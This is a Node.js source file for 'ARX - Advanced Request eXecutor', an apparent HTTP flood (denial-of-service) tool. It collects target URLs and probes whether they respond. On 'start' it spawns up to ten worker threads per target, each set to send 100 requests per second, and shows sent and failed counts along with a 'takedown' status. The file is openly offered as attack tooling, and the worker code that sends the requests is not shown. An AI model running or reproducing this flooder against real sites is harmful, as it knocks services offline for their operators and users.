// main.js
const readline = require('readline');
const { Worker } = require('worker_threads');
const os = require('os');
const chalk = require('chalk');
const http = require('http');

console.clear();
console.log(chalk.greenBright.bold('Selamat datang di ARX - Advanced Request eXecutor [AutoScale]'));

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
readline.emitKeypressEvents(process.stdin);
if (process.stdin.isTTY) process.stdin.setRawMode(true);

let targets = [], workers = [], stats = {}, statuses = {}, started = false;

function askURL(index = 0) {
  rl.question(`Target URL #${index + 1} (leave blank to finish): `, async url => {
    if (!url.trim()) {
      if (targets.length === 0) return askURL(index);
      return askCommand();
    }
    const isLive = await testTarget(url.trim());
    targets.push(url.trim());
    statuses[url.trim()] = isLive ? 'live' : 'down';
    stats[url.trim()] = { sent: 0, success: 0, failed: 0 };
    askURL(index + 1);
  });
}

function askCommand() {
  rl.question('Type "start" to begin attack: ', (input) => {
    if (input.trim().toLowerCase() === 'start') {
      startAttack();
    } else {
      askCommand();
    }
  });
}

function testTarget(url) {
  return new Promise(resolve => {
    const req = http.get(url, { timeout: 5000 }, res => {
      res.resume();
      resolve(true);
    });
    req.on('error', () => resolve(false));
    req.on('timeout', () => {
      req.destroy();
      resolve(false);
    });
  });
}

function startAttack() {
  started = true;
  targets.forEach((url, i) => {
    const cpuCount = os.cpus().length;
    const threads = Math.min(10, cpuCount);
    const rps = 100;
    for (let j = 0; j < threads; j++) {
      const worker = new Worker('./worker.js');
      worker.postMessage({ url, rps });
      worker.on('message', ({ sent, success, failed }) => {
        stats[url].sent += sent;
        stats[url].success += success;
        stats[url].failed += failed;
      });
      workers.push(worker);
    }
  });
  displayStats();
  listenCommand();
}

function displayStats() {
  setInterval(() => {
    readline.cursorTo(process.stdout, 0, 2);
    targets.forEach((url, i) => {
      const s = stats[url];
      const status = statuses[url] === 'live' ? chalk.greenBright('live') : chalk.redBright('takedown');
      readline.clearLine(process.stdout, 0);
      process.stdout.write(`[STATS #${i}] ${chalk.yellow('Sent')}: ${s.sent} | ${chalk.green('Success')}: ${s.success} | ${chalk.red('Failed')}: ${s.failed} | ${chalk.cyan('Target')}: ${url} | ${status}\n`);
    });
    readline.moveCursor(process.stdout, 0, 1);
    readline.clearLine(process.stdout, 0);
    process.stdout.write('Command (stop): ');
  }, 1000);
}

function listenCommand() {
  rl.on('line', line => {
    if (line.trim().toLowerCase() === 'stop') {
      workers.forEach(w => w.terminate());
      console.log(chalk.redBright('\n[STOPPED] All targets stopped.'));
      process.exit(0);
    }
  });
}

askURL();
